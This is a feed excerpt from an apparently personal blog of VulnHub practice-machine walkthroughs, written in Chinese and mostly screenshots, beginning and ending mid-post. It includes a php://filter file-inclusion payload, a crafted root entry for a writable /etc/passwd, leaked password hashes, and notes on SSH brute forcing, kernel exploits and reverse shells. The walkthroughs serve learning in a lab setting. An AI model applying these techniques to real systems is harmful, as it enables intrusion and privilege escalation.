&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2125052416407b515fe704f6a94753b8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有些时候很想要报警啊，试了半天，没想到是要大写啊：&lt;/p&gt;
&lt;p&gt;8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2fd89f5e93613637d52e107deb25a455%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;文件包含：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf2a545538bb02d866f293c78d1cd2506%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;远程文件包含尝试：&lt;/p&gt;
&lt;p&gt;http看样子是不行的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0d6af8fd3d324fca979a5281004ea43b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是看这个是个simple file brower，会不会是走sftp协议的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd68f52e2d8edaceec2aaf5c813357322%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可惜一直不让我看源码，一看就卡住：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf86444f9756f6c45aaba79d4a68917f7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;得用伪协议改一下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;php://filter/read=convert.base64-encode/resource=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE41089606fac16ce928c9500d8a7e6f35%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;弄是弄出来了，没发现可以利用的地方啊，代码审计吧：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;attachments/WEBRESOURCE0fbb1544939ce5af7e61843adabb2430home.php&#34;&gt;home.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;attachments/WEBRESOURCE8d7d8e88879da6e5d5fd4dc185d2ec92authenticate.php&#34;&gt;authenticate.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;没看懂，这里是search了存放session的文件嘛，cookie里面的user_pref值会赋值给session里面的user_pref，这个代码我看懂了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE881c4e3ae7dfdd1cdd76d540cdfcd048%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是这存放session的路径哪儿来的？？难不成是默认的？后面看了一下，还真的是:&lt;/p&gt;
&lt;p&gt;Session的存储位置获取：一般是通过以下两种方式。&lt;/p&gt;
&lt;p&gt;（1）通过&lt;a href=&#34;https://so.csdn.net/so/search?q=phpinfo&amp;amp;spm=1001.2101.3001.7020&#34;&gt;phpinfo&lt;/a&gt;的信息可以获取到Session的存储位置。phpinfo中的session.save_path存储的是Session的存放位置。通过phpinfo的信息获取到session.save_path为/var/lib/php/session。&lt;/p&gt;
&lt;p&gt;（2）通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在/var/lib/php/session目录下。默认存储Session存放位置。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE45658344363bc0c1e6be9e5fbdf8bae8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;直接PHP弹shell吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd081e8dcab60bb05286c54d34c276fb0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8251f9fb07cd24859ceea72ce62b4335%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE593b496994e2bfc0cd948cf6c797192f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x039 Tr0ll</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x039-tr0ll/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x039-tr0ll/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0e1365685896ce51ffe42babe7a95c23%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE074facdab6002961c4303f213d488e1f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb1c0a93c44701eb73d9f2641be93d73f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;这台靶机的思路比较骚，隐藏的信息也比较多：&lt;/p&gt;
&lt;p&gt;挨个端口看：&lt;/p&gt;
&lt;p&gt;21发现pacp包&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaaefaad85575ae76f21f06fb39744f2a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是pacp包的查看方式，我最开始使用的是whireshark，然后看了半天找不到重点，后面才知道可以用strings慢了来看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0f2759b02bc89e0d72eb1005712ea5f6%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后就可以看到路径了，由于web之前扫了半天没发现可用信息，这是个web目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaec3db98de920a29654e059b0bc59a98%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个东西打开运行，看起来真的有可能是内存地址，但是实际上是个web目录，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEca3f8275a6aa6e1abede34ce448ffbaf%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;目录下面两个文件：&lt;/p&gt;
&lt;p&gt;第一个显然是用户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc44be09bf0ebae3ebe85bcca63aaf997%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;第二个说有密码，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8b5d2a996b1eb2c3ebac1e21aa5028aa%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后就是SSH爆破，&lt;/p&gt;
&lt;p&gt;由于目标机器开了一些放爆破的设置，如果使用medusa爆破就会出现直接卡住的情况：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0a7eeea488f3456e12bc6076c331f5cf%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;如果使用hydra去爆破，不清楚是不是因为hydra速度较快还是顺序问题，就可以直接爆破成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1bd40110077935ee9683de62da0febc1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面看了视频，最好的解决方式是crackmapexec的排除法，将已经爆破了的账户删掉，爆破剩下的账户，最后就可以排除出来合法的用户了，可能是因为crackmapexec显示的内容更加细节一些：&lt;/p&gt;
&lt;p&gt;可以看到前面的都是认证失败，后面的才是连接失败&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5ffae689817ccdb52da20634281aeed2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;很好，这个脏牛又把机器打崩了&lt;/p&gt;
&lt;p&gt;坑点4 会话时间很短，很容易就断了&lt;/p&gt;
&lt;p&gt;最后是37292这个打成功了&lt;/p&gt;
&lt;p&gt;[CVE-2015-1328] overlayfs&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE14ed2ca3a05b7c9c84072b77dae7aae4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是计划任务也可以提权，可以直接弹shell、&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x040 blackrose-1,509</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x040-blackrose-1509/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x040-blackrose-1509/</guid>
      <description>&lt;p&gt;这次网络修复非常奇葩，记录一下:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;i=&amp;#39;
shift 7 = /
/ = .
shift / = :
= = -
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3bb67d55c126a6dc667c95890ad4b4e7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE95f2a95c2d3a2e07d51ae72a2ffbb842%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa6e15676d2c085ce0b8120415e12fcb2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdebcdbf3eaf9cb7bc3a02c29132f7a7b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80渗透，扫描基本无果：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE85fd1c89bc4d8017671da42b1274b35f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名枚举，有admin账户：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE00d5b379aa51430af89d2b11b8fd8d02%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。&lt;/p&gt;
&lt;p&gt;然后时隔一个月，再次打开这个靶机：&lt;/p&gt;
&lt;p&gt;首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：&lt;/p&gt;
&lt;p&gt;这里的知识点是，后端采用的是&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int strcmp(string $str1, string $str2)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &amp;lt; 0；如果 str1 大于 str2 返回 &amp;gt; 0；&lt;/p&gt;
&lt;p&gt;当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将&lt;/p&gt;
&lt;p&gt;只要我们$_POST[‘password’]是一个&lt;/p&gt;
&lt;p&gt;通过拦截修改数据包就可以登录后台：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd3f23e9ecd2b0b3fb0455edc7571813d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;就可以看到如下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE273d1293b5dedf0d364b0c85c04c86b0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后这里有个输入框：可以执行命令：&lt;/p&gt;
&lt;p&gt;但是只能执行whoami，执行其他的就会提示签名错误：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf0cd0356fc8973869b4d63f3f2da7715%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE584fe93e66e8821e136838991acd19d8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么现在就是破解这个签名，看看这个签名写的啥，加密方式为&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb8f92125755cfe938fb8beadba5bbbcf%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x041 Chili</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x041-chili/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x041-chili/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEeeadc90a6640f73b17281a4e92454ff3%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9ca1efef375b765dfd3179dcc8f00fbe%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcca80187dba627272593584d5f1ca45d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;21端口匿名登录失败吗，那就只能看80端口了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE314b058a81141db97eae8b02efe157fe%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口和图片大致看了一下，没有发现隐藏信息，然后就用cewl收集了一下账户密码，但是这里有个地方没考虑到，那就是chili开头是大写，然后这里应该尝试改成小写：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEca70c67f64233f0005d2b2eeb10215b1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后用hydra进行爆破即可，但是这里完了截图，爆破出来应该是a1b2c3d4:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0fe391cc8c464547415fd2093ee97c26%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看到当前是chili的家目录，第一反应是写密钥，但是很可惜，可以开放ssh服务：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9003b2be5cbc0076f109d201c80f50b5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;从web入手，写shell吧：&lt;/p&gt;
&lt;p&gt;可以发现.nano目录是具有权限的，然后直接把反弹shell的php代码上传上去即可，记得给木马执行权限，直接给777：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb0727ec019c27a75388ad7ecbb13c472%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;passwd文件可写：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6c76748d05ae9d0839cfcde67980cafe%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;chili用户是可以切换的，直接改passwd文件密码吧，密码Abcd1234&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE62e5b3d7d2fb2aba0052d425977bacbf%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc588481c1817e4c5db8d7cea64ab5bc7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x042 Healthcare</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x042-healthcare/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x042-healthcare/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE721e51dce6cbb51dd77f0103d630b374%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1f8a325a62d5ea53cf7d732b00a6ea0a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcb5fed76c836fa3fb24bc8775283f861%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;发现root目录，同时发现疑似提示，htdig to index our doc-tree。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe5bee896284035ca7d5dfa57d08d5eeb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;收集到用户名：mailto&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2f81e86127e92461a9368572c79122e2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;去收集了一下htdig是什么，然后没发现有用的利用方式：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc715cb48f261bce244ad2bc8ff1e19bb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;完犊子，&lt;/p&gt;
&lt;p&gt;/openemr目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2dc9e93042d44e8c1611470bfd44be00%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE669763ecc9aada6e60dcb92515013bdb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;已知漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe99c9babf39ad167769ebd33cde84b3a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改url:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7372197d2030bd3d5099ef705dd492bc%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8&lt;/p&gt;
&lt;p&gt;medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9438afb5408cf36f1f6d824423833aaa%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ackbar&lt;/p&gt;
&lt;p&gt;medical&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6433f10c8f0b2588dfc5e4748f932a6d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;在这个地方修改文件即可getshell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3336070e4d90be577f491a170b6be89a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb1289f6b9292b8f0a3ba13d0f7e4a6f1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;有点懒了，看了一下提示：/usr/bin/healthcheck：&lt;/p&gt;
&lt;p&gt;strings查看一下：&lt;/p&gt;
&lt;p&gt;就可以琢磨一下该如何提权了，执行了ifconfig、fdisk、du等命令&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfab4d42f7c9735cfd7bf58067508686d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;环境变量劫持：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8e614d21cd198ebe1ed8ee176dcb1a64%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x043 sunset dawn</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x043-sunset-dawn/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x043-sunset-dawn/</guid>
      <description>&lt;p&gt;要改网络环境&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfcf39f4415ab4ce05541b96bb66aa5d2%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE66050efeac080fa8a5a93f698f44e958%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE75256777e579269d7ff0a2113a8a01f1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;先看了一下smb，发现有未授权，但是没有什么信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE163afbe54b75d8e755334f7d0a3b7a3d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9b92fda3276da5d2dc45874f5392f64d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;扫描发现log目录，说了以下几个目录，可能可以利用？其他东西就没了，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE358e16ae51a4ac296e188f3c54b43f38%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
